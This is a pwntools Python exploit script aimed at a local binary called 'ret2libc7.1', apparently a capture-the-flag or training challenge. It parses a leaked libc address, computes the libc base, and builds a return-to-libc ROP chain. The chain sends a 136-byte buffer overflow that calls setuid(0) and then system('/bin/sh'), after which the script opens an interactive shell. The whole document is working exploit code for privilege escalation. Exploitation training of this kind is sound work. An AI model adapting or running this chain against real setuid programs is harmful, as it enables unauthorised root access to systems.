from pwn import *
binary = ELF('ret2libc7.1')
puts_plt = binary.plt['puts']
puts_got = binary.got['puts']
main_addr = binary.symbols["main"]
chall_addr = binary.symbols["challenge"]
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
print(libc.symbols["puts"])
rop = ROP(binary)
gadget_address = rop.find_gadget(['pop rdi', 'ret'])[0]
r = process("ret2libc7.1")
# First Stage
original_bytes = bytes.fromhex(r.read()[82:-3].decode())
print(original_bytes.hex())
print(libc.symbols["system"])
original_bytes = int(original_bytes.hex(),16)-libc.symbols["system"]
system = original_bytes +libc.sym['system']
suid = original_bytes +libc.sym['setuid']
BIN_SH = next(libc.search(b"/bin/sh"))
bin_addr = BIN_SH +original_bytes
log.info(f"basse Addr glibc {hex(original_bytes)}")
log.info(f"SYSTEM Addr {hex(system)}")
log.info(f"/bin/sh Addr {hex(bin_addr)}")
log.info(f"Setuid Addr {hex(suid)}")
payload = b'A'*136+p64(gadget_address)+p64(0x0)+p64(suid)+p64(gadget_address)+p64(bin_addr)+p64(system)
r.send(payload)
r.interactive()